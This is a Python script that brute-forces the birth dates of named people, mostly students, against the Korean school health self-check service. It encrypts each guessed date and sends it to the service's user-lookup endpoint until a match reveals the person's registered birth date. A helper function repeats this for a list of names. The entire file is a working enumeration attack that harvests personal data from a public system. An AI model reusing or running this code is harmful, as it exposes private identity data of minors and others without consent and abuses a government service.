import aiohttp
import datetime as dt
from platform import system
from typing import Any, Final
from base64 import b64decode, b64encode
from dataclasses import dataclass as dc
from Cryptodome.Cipher.PKCS1_v1_5 import new
from Cryptodome.PublicKey.RSA import importKey
from dateutil.relativedelta import relativedelta as red

if system() == 'Windows':
    from asyncio import (
        set_event_loop_policy as setPolicy,
        WindowsSelectorEventLoopPolicy as EventLoopPolicy
    )
    setPolicy(EventLoopPolicy())

URL: Final = 'hcs.eduro.go.kr/v2'

@dc
class School:
    key: str
    orgCode: str
    sidoURL: str


def safeType(c: Any, t: type):
    try:
        return t(c)
    except TypeError:
        return False


def encrypt(s: str) -> str:
    return b64encode(new(importKey(b64decode(
        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCnCKt0NVH7j5Oh2+SGgEU'
        '0aqi5u6sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jWUmkYIQ'
        '8o3FGqMzsMTNxr+bAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7'
        'yDzcfjfBs99K5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzh'
        'wUC8T4G5NclLEWzOQExbQ4oDlZBv8BM/WxxuOyu0I8bDUDdutJOfREYRZBlazFHvRKNN'
        'QQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHjJzGs9MMMWtQIDAQAB=='
    ))).encrypt(message=s.encode('utf-8')[:245])).decode('utf-8')


async def school(
    sName, sess: aiohttp.ClientSession, level=3, sido='13'
) -> School:
    params = {
        'lctnScCode': sido,
        'schulCrseScCode': level,
        'orgName': sName,
        'loginType': 'school'
    }
    async with sess.get(
        url=f'https://{URL}/searchSchool', params=params
    ) as r:
        d = await r.json()
        return School(
            d['key'],
            d['schulList'][0]['orgCode'],
            d['schulList'][0]['atptOfcdcConctUrl']
        )


async def req(
    birth: str, eName: str, sInfo: School, sess: aiohttp.ClientSession
):
    data = {
        'searchKey': sInfo.key,
        'orgCode': sInfo.orgCode,
        'name': eName,
        'birthday': encrypt(birth),
        'loginType': 'school'
    }
    async with sess.post(
        url=f'https://{sInfo.sidoURL}/v2/findUser', json=data
    ) as res:
        return (await res.json()).get('isError')


async def find(name, yy=None, mm=None, dd=None, sName='서일중학교', level=3, ey=False):
    date = dt.date(1960, 1, 1)
    eName = encrypt(name)
    sess = aiohttp.ClientSession()
    sInfo = await school(sName, sess, level)
    iy, im, i_d = safeType(yy, int), safeType(mm, int), safeType(dd, int)
    date = dt.date(iy or 1960, im or 1, i_d or 1)
    
    while not ey or date.year<int(ey):
        dateStr = dt.date.strftime(date, '%y%m%d')
        print(f'\r{name} 님의 생년월일을 찾는 중... {dateStr}', end='')
        try:
            if not await req(dateStr, eName, sInfo, sess):
                print(f'\r{name} 님의 주민등록 상 생년월일(YYMMDD)은 {dateStr}입니다.')
                break
        except KeyboardInterrupt:
            print(f'\nCTRL-C가 눌려 중단합니다.')
            break
        except:
            continue
        if ey and date.year>=int(ey):
            print(f'\n찾고 있는 날짜가 검색 중단 연도가 되어 탐색을 중지하였습니다.')
            break
        date += red(years=1) if not iy and im and i_d else red(days=1)
    await sess.close()


def multiFind(nameList, *args, **kwargs):
    for s in nameList:
        find(s, *args, **kwargs)